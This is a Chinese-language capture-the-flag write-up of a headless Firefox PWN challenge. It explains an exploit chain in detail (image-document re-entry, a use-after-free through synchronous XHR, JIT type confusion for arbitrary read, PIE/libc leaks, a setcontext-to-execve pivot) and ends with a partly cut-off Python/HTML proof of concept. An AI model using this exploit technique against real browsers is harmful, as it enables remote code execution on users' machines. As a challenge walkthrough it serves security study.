# What The Fox!

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 分类 | PWN |
| 形态 | 混合题（附件+容器） |
| 附件 | What_The_Fox_bff14d2d1ca2da67f016aaa0cb38b975.zip |
| 目标 | 在headless Firefox中执行代码，运行/readflag |

Flag：flag{动态容器已脱敏}

题面只有一句“what the fuck do you want from what the fox”。附件`firefox.zip`里只有一个679632字节的`firefox`文件，是Firefox的launcher，不是完整`libxul.so`，主要用于版本指纹。

## 2. 题目分析

### 服务协议

连接服务后提示：

```text
What The Fox?!
Input one HTML payload; end it with a line containing only EOF.
```

这条协议本质是一个单向的“喂料—等结果”通道：客户端把整段HTML写进服务的stdin，服务读到只含`EOF`的一行就截断，把收到的文本落成一个HTML文件，再用headless Firefox打开它；Firefox进程的stdout被接回同一条TCP连接，于是页面里每一次`dump(...)`都会逐行出现在客户端。由此可以确定三件事：

1. 每次连接只跑一个payload、只渲染一次，重放只能靠重连，上传脚本里的重试循环正是为此存在；
2. 真正的观测信道是`dump()`，它依赖profile中打开的`browser.dom.window.dump.enabled`，所以调试信息必须由payload自己打印，不能指望浏览器的报错界面；
3. 结束标记是独立一行的`EOF`，payload内部不能出现同名整行，否则会被提前截断成半个文档。

headless这个前提直接决定了攻击面的形状：没有窗口、没有用户手势、没有下载确认框，任何“诱导点击”式的思路都失效；但`file://`本来就是题目自己的加载方式，页面与落盘文件同源，`fetch`、`Blob URL`、`<a download>`这些能力都还在。所以题目给的并不是一个网页XSS环境，而是一个“无交互、可反复冷启动”的浏览器进程，剩下的唯一出路是让渲染引擎在解析这份HTML时自己出错。

### 目标与文件

- `/readflag`存在，是ELF；
- `/flag`、`/flag.txt`不存在；
- 用户`ctf`，家目录`/home/ctf`，下载目录`/home/ctf/Downloads`；
- 可用`fetch('file:///readflag', {mode:'no-cors'})`做文件存在性oracle；
- 可用`<a download>`把文件写进Downloads，再从`file:///home/ctf/Downloads/...`执行。

因此最终目标不是直接读`/flag`，而是让浏览器进程执行`/readflag`，把它的stdout（带`FLAG_START`/`FLAG_END`包裹）回传到串口。

### 版本指纹

先要把build卡准，因为漏洞利用里写死了一串偏移，它们与具体构建一一对应：

1. 页面里存在`SpeechRecognition`/`webkitSpeechRecognition`/`processLocally`/`phrases`，对应源码不早于2026-10-16 16:00 UTC；
2. launcher没有`getauxval`/`realpath`导入，对应源码早于2026-10-19 00:59 UTC。

两条一夹，可用窗口只剩两天多。这个窗口不是可有可无的细节：`vptr - 0xc47abc0`（PIE基址）、`base + 0xc68d5a8`（`read`的GOT槽）、libc侧的`0x128150`/`0xf7f00`/`0x4be80`全部是常量，换一个构建就会整体错位，泄露出来的“基址”会变成噪声，后续`setcontext`直接跳到随机地址。launcher只有679632字节且不含完整`libxul`，因此它只承担指纹作用，真正的偏移来自同版本的`libxul.so`调试符号比对。

### 攻击面判断

题目的验收标准很硬：必须让浏览器进程执行`/readflag`并把标准输出送回连接。`/flag`本身不可读、`/readflag`只是一个ELF，所以“读文件”这条路被刻意堵死，只有“执行”才有意义。渲染进程已经持有需要的全部能力——它是普通Linux进程，`execve`系统调用就在libc里；一旦在渲染进程内拿到任意读写，就能自己拼出`execve("/bin/sh", ...)`，无需再做任何跨进程或提权动作。因此整道题被压缩成一条纯粹的“渲染进程内JS引擎+ imagelib内存破坏”链，而不需要处理浏览器UI或IPC。

### 因果链预览

五个Stage是一条单向依赖链，任何一环失败后面都无从谈起：

1. **Image文档**把图片加载状态的回放路径接进JS，制造“native代码回调页面脚本”的入口；
2. **同步XHR**在入口内排空嵌套事件循环，让被取消加载的proxy完成异步释放，形成UAF窗口；
3. **JIT类型混淆**把double的位模式当成字符串长度，把长度压到8字节，得到可改data指针的任意读写；
4. **对象泄露**从`Image`与`Uint8Array`的wrapper里取出JS对象地址、native指针、vptr、backing store，从而反推PIE与libc；
5. **伪造对象**在被回收的内存上摆好`setcontext`与`execve`的参数，等虚调用踩上去，最终`/bin/sh -c '... /readflag ...'`把flag打到stdout。

换句话讲，Stage 1解决“什么时候能动手”，Stage 2解决“动哪块内存”，Stage 3解决“怎么改”，Stage 4解决“改成什么”，Stage 5解决“改完怎么跳”。

## 3. 解题过程

### Stage 1：构造可重入的Image文档

HTML根元素带`class="reftest-wait"`，`load`事件里依次做：

1. 用一张内联PNG的`data:`URL预热`preload`；
2. 创建一个隐藏`about:blank` iframe，取其`contentDocument`，放入一个`contenteditable`的div；
3. 再创建一个`iframe`，`src`指向同一张PNG的`Blob URL`；
4. 在iframe的`contentWindow`上注册捕获阶段的`readystatechange`监听。

当iframe文档进入`interactive`且`contentType === "image/png"`时，说明Firefox为图片单独创建了image document：

```js
imageDocument = d;
nativeImage = d.querySelector("img");
hiddenDoc.body.append(hiddenDoc.adoptNode(nativeImage));
nativeImage.src = cachedURL;
armStyleFlush();
```

随后`armStyleFlush()`构造一个SVG：

- `defs/g#replay-source`里放一个`type="application/json"`的`script`，内容是`replayPayload()`；
- 把`script`的type改成`application/javascript`；
- 再创建一个`<use href="#replay-source">`。

样式刷新与SVG use克隆会在图片`SIZE_AVAILABLE`/`LOAD_COMPLETE`的回放路径中重新进入页面脚本，从而在`replayPayload()`里与图片加载状态发生重入。

这一串操作每一步都有明确目的，缺一环重入就不会发生：

- **为什么挑图片文档**：直接用`file://`打开一张图，Firefox不会渲染成`<img>`页面，而是由imagelib生成一个合成文档，等图片尺寸可用（`SIZE_AVAILABLE`）和加载完成（`LOAD_COMPLETE`）时各走一次`ShrinkToFit`。这条native回放路径会修改`width`，进而触发样式刷新，而样式刷新是少数能在“非脚本调用栈”上重新进入JS的时机。把它放在iframe里，是为了让这份文档有独立的事件循环和独立的`readystatechange`，同时爆发点又和父文档共享同一个JS上下文。
- **为什么要`contenteditable`的隐藏文档**：`about:blank`的隐藏iframe没有PresShell，编辑器的初始化会在半途挂起；之后一次native属性更新会重试这次初始化，并顺带flush父文档样式。这正是“从CSS刷新回到JS”的那道门，`readystatechange`里没有它，`armStyleFlush()`的改动不会在预期时刻被消费。
- **为什么要`adoptNode`再改`src`**：把原生`<img>`从image document搬到隐藏文档，可以让它继续由JS持有一个强引用，同时脱离原来那份文档的生命周期；随后把`src`换成预热过的`data:` URL，保证第二次加载命中缓存、立刻推进到`SIZE_AVAILABLE`，让重入点尽可能靠近可控时机。
- **为什么`type`要改两次**：`application/json`的`script`不会被当作代码执行，它的文本只是数据；改成`application/javascript`后再插入`<use href="#replay-source">`，SVG use的克隆过程才需要实例化这份脚本，于是`replayPayload()`在克隆内部被调用——调用栈上压着渲染与样式相关帧，这正是重入所需要的“脏栈”。
- **`reftest-wait`的作用**：它本身不改变引擎行为，只作为“页面尚未结束”的标记；最后移除它，页面才会真正走完加载，使得前面的重入发生在浏览器认为“还在加载中”的阶段，避免被后续的导航或生命周期清理打断。

### Stage 2：重入窗口与同步XHR排空

`replayPayload()`只执行一次：

```js
if (fired) return;
fired = true;
runJIT();
nativeImage.removeAttribute("src");
const xhr = new XMLHttpRequest();
xhr.open("GET", location.pathname + "?drain=" + Math.random(), false);
xhr.send();
```

`removeAttribute("src")`会取消正在进行的图片加载，但取消后的proxy还要等一个异步`RemoveFromLoadGroup` runnable才释放最后一个引用。同步XHR会进入嵌套事件循环，正好让这个runnable执行，于是proxy在JS仍持有相关对象时被释放。

紧接着创建100个0xf0字节的`Blob`，内容是伪造的native对象字段：

```js
d.setBigUint64(0x10, ctx.stack, true);      // 栈/ pivot
d.setBigUint64(0x18, ctx.execve, true);     // 目标函数
d.setUint32(0x40, 0x1f80, true);
d.setBigUint64(0x50, BigInt(window.fakeDataPtr), true);
d.setBigUint64(0x60, BigInt(window.fakeDataPtr), true);
d.setBigUint64(0xc8, ctx.path, true);       // "/bin/sh"
d.setBigUint64(0xd0, ctx.argv, true);       // argv
```

最后把`nativeImage`重新adopt到image document的body里，移除`reftest-wait`，让页面正常结束。被释放的image对象由这些Blob内容回收，后续访问就会走到伪造字段。

这段代码的时序是整条链里最脆弱的部分，值得逐句解释：

- **`fired`守卫**：重入本身会发生多次——`SIZE_AVAILABLE`一次、`LOAD_COMPLETE`一次，期间的样式刷新还可能再来一次。第一次进入时堆布局是精心安排的，第二次进入时`nativeImage`已被摘掉`src`、Blob已经喷射过，再执行一遍只会把刚布好的堆打乱。因此只认第一次，后续全部早退。
- **为什么先`runJIT()`再取消加载**：JIT训练与对象喷射要求堆相对“干净”，此时图片正在加载但尚未回调，托管堆没有被重入污染；如果放到XHR之后，混淆出来的字符串与喷射对象就要和排空事件循环时产生的大量临时分配抢位置，命中率会明显下降。
- **`removeAttribute("src")`的真正作用**：它不只是停止下载，而是让图片请求进入取消路径。取消并不会立刻销毁proxy，而是投递一个`RemoveFromLoadGroup` runnable，等它被执行时最后一个引用才真正归零。“释放”被推迟到了一个看不见的异步点。
- **同步XHR是排空工具**：`xhr.open(..., false)`加`send()`会进入嵌套事件循环，把上述runnable从队列里取出来执行。用`location.pathname + "?drain=" + Math.random()`是为了绕开缓存，保证真的发起一次请求、真的让出控制权；如果URL命中缓存，这次调用可能直接返回，runnable就不会在窗口内被消费，UAF也就落空。
- **为什么用`Blob`占位**：Blob的内容是一块独立的、由引擎管理的缓冲区，生命周期与JS对象解耦，地址在页面存活期间保持稳定，正好可以在释放发生后立刻填进同一尺寸类。`0xf0`字节的长度是为了贴合被回收对象的大小，100份是为了提高同尺寸类命中的概率。
- **字段偏移的含义**：`+0x10`是后续`setcontext`恢复的栈指针，`+0x18`是恢复后要跳的目标函数，`+0xc8`/`+0xd0`分别是`execve`的路径与argv，`+0x50`/`+0x60`指向同一块伪造数据区。这些偏移全部来自对同版本`libxul`中该对象布局的分析——它们不是随便写的“魔法值”，而是让“被回收的对象被当作正常对象访问”时能读到合法指针的唯一办法。

### JIT类型混淆

`runJIT()`先做类型训练：

```js
function f(o,a,b,h1,h2){var k=a+b;h1.w=k;var r=o.hasOwnProperty(k);h2.x=k;return r}
with({}){}
var N=9000,hs1=[],hs2=[];
for(var i=0;i<N;i++){hs1.push({a:i});hs2.push({a:i})}
var objs=[];for(var i=0;i<5;i++){var o={};o['p'+i]=1;objs.push(o)}
var small={abcdefgh1:1,abcdefgh2:2};
pressure(20);
for(var i=0;i<N;i++){
  var o=small,b='h1';
  if(i>=600&&i<603)o='primitive';
  else if(i>=6000&&i<6005)o=objs[i-6000];
  else if(i>=6005)b='h2';
  f(o,'abcdefg',b,hs1[i],hs2[i])
}
```

`f()`的`k=a+b`在JIT里会被特化；训练阶段让`o`在对象与字符串`'primitive'`之间切换、让`b`在`'h1'`/`'h2'`之间切换，使`h1.w=k`与`h2.x=k`的存储类型推断出现混淆。结果之一是把字符串当作未装箱double写入，另一个方向则把double bit pattern当作字符串对象读取。

随后喷射候选对象：

```js
function header(len,flags=0x450){
  dv.setUint32(0,flags,true);dv.setUint32(4,len,true);return dv.getFloat64(0,true)
}
for(let r=0;r<16;r++){
 let arr=[],base=100000+r*30000;
 for(let j=0;j<30000;j++){let h=header(base+j);arr.push({p0:h,p1:h,p2:h,p3:h,p4:h})}
 ...
}
```

`header(len)`把低32位设成`0x450`、高32位设成`len`，再按double读出。混淆后的字符串读取会把这段double当成“长度字段”，于是`hs2[i].x.length`落在`[base, base+30000)`内。脚本从`i=6006`起扫描`hs2[i].x.length`，找到对应喷射对象`arr[j]`，再依次把`p0..p3`改成`header(8)`，观察`z.length`是否变成8。

一旦长度缩到8，字符串`z`就变成只有8字节的窗口；把相邻slot写成`ptrDouble(p)`，即可改写字符串的data指针：

```js
function at(p){o[hp]=header(8,0x410);o[dp]=ptrDouble(p);return rb()}
function pv(p){let b=at(p),n=0;for(let k=0;k<6;k++)n+=b[k]*2**(8*k);return n}
```

`rb()`用`charCodeAt(0..7)`读出8字节，`pv()`拼成6字节的地址。这样就有了**任意读**。

混淆能够成立，完全依赖训练脚本对优化器反馈的塑造：

- `k=a+b`且`a`恒为`'abcdefg'`，`b`在`'h1'`/`'h2'`之间切换，使`h1.w=k`与`h2.x=k`两个存储点对“值类型”的推断互相矛盾；`with({}){}`把作用域链变成动态的，阻止优化器把属性名折叠成常量，保证`k`真的以运行时字符串参与。
- `i`在`[600,603)`时把`o`换成字符串`'primitive'`，让`o.hasOwnProperty(k)`这个调用点的接收者被记录为字符串；`[6000,6005)`时换成五个形状不同的对象，把属性查找反馈推成多态；`6005`之后`b='h2'`，于是`h2.x`先被训练成“存double”，随后又被持续喂入字符串。两处冲突叠加，最终一个方向把字符串指针当作未装箱double写进去，另一个方向把double的位模式当作字符串对象读出来。
- 一旦“double当字符串”，`z.length`读到的就不再是真实长度，而是伪造double的高32位；`header(len, flags)`正是把低32位设成`0x450`、高32位设成`len`，再按double取出——`0x450`是让伪造的头部看起来像一条合法的拉丁字符串，只有这样长度和字符指针才会被后续代码照常使用。
- 每轮`base=100000+r*30000`、每轮30000个对象，是因为堆地址不可预测，只能把“可识别的长度区间”整体平移去覆盖可能的落点；`hs2[i].x.length`落进区间，就说明第`i`个字符串与`arr[j]`的某个属性槽重叠。
- 逐槽把`p0..p3`换成`header(8)`是探测：只有刚好改到长度字段，`z.length`才会变成8；这一步同时告诉，紧随其后的`dp`槽覆盖的正是字符数据指针，于是`ptrDouble(p)`写进`dp`就等于把字符串的data指针改成任意地址，`at()`再顺手把flags改成`0x410`保证读取稳定，`rb()`就有了一份可控的8字节窗口。

### 泄露JS对象、PIE与libc

先把字符串data指针指向`image`对象，读出`jsobj`；再读`jsobj+24`处的native指针，再读native对象的vptr：

```js
let native=pv(jsobj+24),vptr=pv(native),base=vptr-0xc47abc0;
let elf=at(base),readFn=pv(base+0xc68d5a8),libcBase=readFn-0x128150;
```

- `vptr - 0xc47abc0`得到Firefox PIE基址；
- `base+0xc68d5a8`处是导入的`read`函数指针；
- `readFn - 0x128150`得到libc基址。

再对`view`（`Uint8Array`）做一次同样的对象泄露，读wrapper`+0x30`得到其backing store地址：

```js
let data=pv(vp+0x30);
window.fakeDataPtr=data;
```

这块`view`的buffer之后既存放字符串与argv，也存放伪造的函数表。

泄露顺序是刻意排成三级跳的：字符串data指针指向`image`，读出的是JSValue里的对象地址`jsobj`；`jsobj+24`是JSObject指向native实现的指针；`native`的头8字节是vptr。三级中任何一级读空，后面的减法都会得到垃圾。`vptr - 0xc47abc0`之所以等于PIE基址，是因为该虚表位于`libxul`的只读数据段、相对文件基址固定。选`read`而不是`system`做锚点，是因为`read`是`libxul`从libc导入的普通符号，其槽位地址固定，读出函数真实地址后减去符号偏移即得libc基址；只有拿到libc，`setcontext`与`execve`这两个并不在`libxul`里的地址才算得出来。最后再对`Uint8Array`做一次同样泄露，`+0x30`处就是backing store：这块0x200缓冲区内容完全由JS控制、地址又已知，于是同时充当伪造对象、参数区和栈，免去了额外堆风水。

### 伪造setcontext与execve

```js
const libc=BigInt(libcBase),execve=libc+0xf7f00n,setcontext=libc+0x4be80n;
const B=BigInt(data),stack=B+0x1c8n,path=B+0x100n,arg=B+0x110n;
const cmd=B+0x120n,argv=B+0x170n,envp=B+0x190n;
view.fill(0,0,0x20);
view.set(new TextEncoder().encode("/bin/sh\0"),0x100);
view.set(new TextEncoder().encode("-c\0"),0x110);
view.set(new TextEncoder().encode("echo FLAG_START; /readflag; echo FLAG_END                       \0"),0x120);
tbl.setBigUint64(0x170,path,true);tbl.setBigUint64(0x178,arg,true);
tbl.setBigUint64(0x180,cmd,true);tbl.setBigUint64(0x188,0n,true);
tbl.setBigUint64(0x190,0n,true);
tbl.setBigUint64(0x1c8,0x43434343n,true);
tbl.setBigUint64(0xa8,setcontext,true);
window.setcontextData={stack,execve,path,argv,envp};
```

`argv`是`{"/bin/sh", "-c", "echo FLAG_START; /readflag; echo FLAG_END ...", NULL}`，`envp`为NULL。脚本把`view`的backing store当作伪造对象：`+0xa8`写入`setcontext`作为被调用的函数指针，`+0x1c8`写入栈标记`0x43434343`；Blob字段`+0x10/+0x18`分别提供恢复后的栈与目标函数，`+0xc8/+0xd0`提供路径与argv。重入结束后，被回收的Image对象会读到这些字段，`setcontext`恢复栈后跳到`execve("/bin/sh", argv, NULL)`。

`/readflag`的输出被`echo FLAG_START`/`echo FLAG_END`包住，上传脚本用正则提取：

```python
FLAG = re.compile(rb"(?m)^FLAG_START\r?\n(flag\{[^\r\n}]+\})FLAG_END")
```

这里有两个设计取舍。其一是**为什么用`setcontext`而不是直接`execve`**：UAF触发点只交给一个函数指针和`this`，等于只能控制第一参数`rdi`；`setcontext`恰好把`rdi`当上下文，能一次性把`rsp`切到伪造区，再由`+0x10`的栈指针与`+0x18`的目标函数完成`execve`的调用，用一次受限虚调用换到完整的寄存器布置。`+0xa8`写入`setcontext`是伪造布局中虚表指针的落点，`+0x1c8`的`0x43434343`是栈标记，用来在日志里确认`rsp`确实落进了伪造区而不是别处。其二是**为什么argv走`sh -c`**：直接把路径设成`/readflag`也能执行，但输出边界不可控；套一层shell后用两次`echo`夹住，服务端只要匹配`FLAG_START`与`FLAG_END`之间的那一行即可，末尾填充空格则保证命令长度不因重试而变化；`envp`置空，因为`sh`不依赖环境变量。

### 重试与诊断

`attempt()`每次新建TCP连接，等待`PROMPT`，发送HTML加`EOF`，在超时内持续读取，直到命中Flag正则。默认最多20次、每次65秒、间隔1秒；失败时打印最后的`AUTO hit=`/`BLOB_COUNT=`诊断行。浏览器与堆布局有随机性，重连重试是必要的。

## 4. PoC

```python
#!/usr/bin/env python3
import re, socket, sys
HTML = r'''<html class="reftest-wait"><meta charset="utf-8"><body><script>
function runJIT(){
function f(o,a,b,h1,h2){var k=a+b;h1.w=k;var r=o.hasOwnProperty(k);h2.x=k;return r}
with({}){}
var N=9000,hs1=[],hs2=[];
for(var i=0;i<N;i++){hs1.push({a:i});hs2.push({a:i})}
var objs=[];for(var i=0;i<5;i++){var o={};o['p'+i]=1;objs.push(o)}
var small={abcdefgh1:1,abcdefgh2:2};
for(var i=0;i<N;i++){var o=small,b='h1';if(i>=600&&i<603)o='primitive';else if(i>=6000&&i<6005)o=objs[i-6000];else if(i>=6005)b='h2';f(o,'abcdefg',b,hs1[i],hs2[i])}
const image=new Image(),view=new Uint8Array(0x200),mem=new ArrayBuffer(8),dv=new DataView(mem);view.fill(0x41);
function header(len,flags=0x450){dv.setUint32(0,flags,true);dv.setUint32(4,len,true);return dv.getFloat64(0,true)}
function ptrDouble(p){dv.setUint32(0,p%4294967296,true);dv.setUint32(4,Math.floor(p/4294967296),true);return dv.getFloat64(0,true)}
const slots=["p0","p1","p2","p3","p4"];let hit=null;window.spray=[];
for(let r=0;r<16&&!hit;r++){
 let arr=[],base=100000+r*30000;
 for(let j=0;j<30000;j++){let h=header(base+j);arr.push({p0:h,p1:h,p2:h,p3:h,p4:h})}
 for(let i=6006;i<N&&!hit;i++){let z=hs2[i].x,n=z.length;if(n<base||n>=base+30000)continue;let j=n-base,o=arr[j];for(let k=0;k<4;k++){let old=o[slots[k]];o[slots[k]]=header(8);if(z.length===8){hit={i,j,slot:k};window.spray=arr;break}o[slots[k]]=old}}
}
if(hit){let s=hs2[hit.i].x,o=window.spray[hit.j],hp=slots[hit.slot],dp=slots[hit.slot+1];
let rb=()=>{let b=[];for(let k=0;k<8;k++)b.push(s[k].charCodeAt(0));return b};
let at=p=>{o[hp]=header(8,0x410);o[dp]=ptrDouble(p);return rb()};
let pv=p=>{let b=at(p),n=0;for(let k=0;k<6;k++)n+=b[k]*2**(8*k);return n};
o[hp]=header(8);o[dp]=image;let b=rb(),jsobj=0;for(let k=0;k<6;k++)jsobj+=b[k]*2**(8*k);jsobj%=2**47;
let native=pv(jsobj+24),vptr=pv(native),base=vptr-0xc47abc0,readFn=pv(base+0xc68d5a8),libcBase=readFn-0x128150;
o[hp]=header(8);o[dp]=view;let vb=rb(),vp=0;for(let k=0;k<6;k++)vp+=vb[k]*2**(8*k);vp%=2**47;let data=pv(vp+0x30);window.fakeDataPtr=data;
const tbl=new DataView(view.buffer),libc=BigInt(libcBase),execve=libc+0xf7f00n,setcontext=libc+0x4be80n;
const B=BigInt(data),stack=B+0x1c8n,path=B+0x100n,arg=B+0x110n,cmd=B+0x120n,argv=B+0x170n;view.fill(0,0,0x20);
view.set(new TextEncoder().encode("/bin/sh\0"),0x100);view.set(new TextEncoder().encode("-c\0"),0x110);
view.set(new TextEncoder().encode("echo FLAG_START; /readflag; echo FLAG_END\0"),0x120);
tbl.setBigUint64(0x170,path,true);tbl.setBigUint64(0x178,arg,true);tbl.setBigUint64(0x180,cmd,true);
tbl.setBigUint64(0x188,0n,true);tbl.setBigUint64(0x190,0n,true);tbl.setBigUint64(0x1c8,0x43434343n,true);
tbl.setBigUint64(0xa8,setcontext,true);window.setcontextData={stack,execve,path,argv};
}}
</script>
<script>
"use strict";
const png="iVBORw0KGgoAAAANSUhEUgAABkAAAAPoAQAAAACuAA8uAAAA2UlEQVR42u3BMQEAAADCoPVP7W8GoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgDcRVQABr+DkXQAAAABJRU5ErkJggg==";
const cachedURL="data:image/png;base64,"+png;
const rawURL=URL.createObjectURL(new Blob([Uint8Array.from(atob(png),c=>c.charCodeAt(0))],{type:"image/png"}));
const preload=new Image();let imageDocument,nativeImage,fired=false;
function finish(){document.documentElement.classList.remove("reftest-wait")}
function replayPayload(){
 if(fired)return;fired=true;
```
